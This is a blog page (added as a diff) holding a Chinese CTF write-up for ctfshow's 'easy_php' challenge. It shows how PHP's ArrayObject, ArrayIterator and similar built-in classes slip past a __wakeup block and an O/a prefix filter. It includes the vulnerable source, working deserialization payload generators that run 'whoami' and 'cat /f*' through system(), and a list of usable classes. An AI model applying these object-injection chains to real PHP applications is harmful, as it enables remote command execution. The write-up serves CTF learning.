@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>愚人杯3rd [easy_php] - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="愚人杯3rd [easy_php] - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-04-02T15:24:12.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>April</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">愚人杯3rd [easy_php]</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>Web题里没啥好讲的，唯一一题就是个小0day，就记录这一题<br>比较崭新的考点，其实也不是0day了。。。就是个新trick罢了</p>
+<h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h1><p>考点：PHP7.3 __wakeup绕过，ArrayObject内置类<br>众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了QWQ<br>这种情况我们可以用内置类<strong>ArrayObject</strong>，这个内置类序列化结果如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="variable">$ao</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ao</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680441736178-906d765b-213f-4a23-a6ce-34691af8eff6.png#averageHue=%23232624&clientId=u6a110780-8f4b-4&from=paste&height=153&id=u3a274350&name=image.png&originHeight=191&originWidth=1275&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=362279&status=done&style=none&taskId=ub4dacfe5-79f4-4c43-9eb5-686e3120dda&title=&width=1020" alt="image.png"><br>可以看到是C开头的，既然是C开头的，假如我们遇到了这样的题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个题目很明显就是要执行system方法，然后不可以以<code>O\a</code>打头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是这里都去掉了，所以回到上面说的那个ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680442247318-d9e2d8e9-77f9-4dae-a9b4-3bf2d5f5cbb4.png#averageHue=%23cfae77&clientId=u6a110780-8f4b-4&from=paste&height=535&id=u6b54d121&name=image.png&originHeight=669&originWidth=2013&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43924&status=done&style=none&taskId=ua36cd2dd-8db7-4dc0-bb87-c8c969f4d80&title=&width=1610.4" alt="image.png"></p>
+<h1 id="赛后思考"><a href="#赛后思考" class="headerlink" title="赛后思考"></a>赛后思考</h1><p>还有什么其他的方法可以绕过吗？我们可以通过如下脚本找一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;unserialize&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        ))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680442578583-86fd3900-02d1-4100-9dcb-d59cf295ab0d.png#averageHue=%23212321&clientId=u6a110780-8f4b-4&from=paste&height=229&id=u01029c25&name=image.png&originHeight=286&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=564379&status=done&style=none&taskId=udd64cf08-4904-4097-a14d-846e7c595e9&title=&width=1076" alt="image.png"><br>结果如下，注意到了还有ArrayIterator，实现了unserialize接口的大概率是C打头，因此在这几个类中寻找！<br>测试发现ArrayIterrator是可以的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680442626939-66b69424-92ab-4420-98c3-dae09ddb6e71.png#averageHue=%23232624&clientId=u6a110780-8f4b-4&from=paste&height=86&id=u535ed4ba&name=image.png&originHeight=108&originWidth=1165&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204438&status=done&style=none&taskId=ua005bb87-7952-459c-8ac9-9c6e453cf39&title=&width=932" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680442630997-98b96988-ee42-43ef-8dcb-ccb4857e257d.png#averageHue=%23f5f5f4&clientId=u6a110780-8f4b-4&from=paste&height=549&id=uea72d93f&name=image.png&originHeight=686&originWidth=2202&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35322&status=done&style=none&taskId=u545c6b94-1bf4-4e13-be42-6f2e165ba05&title=&width=1761.6" alt="image.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>经过所有测试发现可以用的类为：</p>
+<ul>
+<li>ArrayObject::unserialize</li>
+<li>ArrayIterator::unserialize</li>
+<li>RecursiveArrayIterator::unserialize</li>
+<li>SplObjectStorage::unserialize</li>
+</ul>
+<p>其中SplObjectStorage需要注意一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680443033856-2a8ba77e-189a-4c79-b95e-f9bdb384ef1c.png#averageHue=%232a2c29&clientId=u6a110780-8f4b-4&from=paste&height=494&id=u5c72f1af&name=image.png&originHeight=618&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1628325&status=done&style=none&taskId=u5178a3b7-5329-44bf-82f8-f175d888aee&title=&width=1522.4" alt="image.png"><br>利用情况是可以自己给他加上一条</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/04/05/Boogipop-Forest/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Forest</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/04/02/VNCTF2023/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">VNCTF2023-WriteUp</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
